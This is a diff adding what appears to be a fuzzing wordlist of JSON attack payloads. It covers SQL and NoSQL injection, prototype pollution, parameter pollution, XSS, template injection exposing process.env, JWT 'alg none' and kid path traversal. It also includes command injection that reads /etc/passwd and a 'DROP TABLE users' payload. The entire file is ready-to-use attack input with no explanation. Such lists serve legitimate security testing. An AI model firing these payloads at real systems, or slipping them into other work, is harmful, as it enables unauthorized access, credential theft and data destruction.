@@ -1,0 +1,42 @@
+# Basic JSON injections
+{"test":"alert(1)"}
+{"username":"admin'--"}
+{"id": "' OR '1'='1"}
+
+# NoSQL injection
+{"username": {"$ne": null}}
+{"username":"admin", "password":{"$gt":""}}
+{"$where": "this.password.match(/.*/)"}
+
+# JSON parameter pollution
+{"username":"admin", "username":"superadmin"}
+{"username":["admin", "superadmin"]}
+
+# Prototype pollution
+{"__proto__": {"admin": true}}
+{"constructor": {"prototype": {"admin": true}}}
+
+# Command injection via JSON
+{"username": "$(cat /etc/passwd)"}
+{"username": "`cat /etc/passwd`"}
+{"username": "admin", "$where":"sleep(5000)"}
+
+# XSS via JSON
+{"html":"<script>alert(1)</script>"}
+{"message":"<img src=x onerror=alert(1)>"}
+
+# JSON with JavaScript execution
+{"code": "return process.env"}
+{"template": "{{constructor.constructor('return process.env')()}}"}
+
+# Type confusion
+{"id": true}
+{"id": [1,2,3]}
+{"admin": 1}
+
+# Nested exploitation
+{"user": {"id": "1; DROP TABLE users;--", "role": {"$ne": "user"}}}
+
+# JSON web token attacks
+{"alg":"none"}
+{"alg":"HS256","typ":"JWT","kid":"../../../../dev/null"}
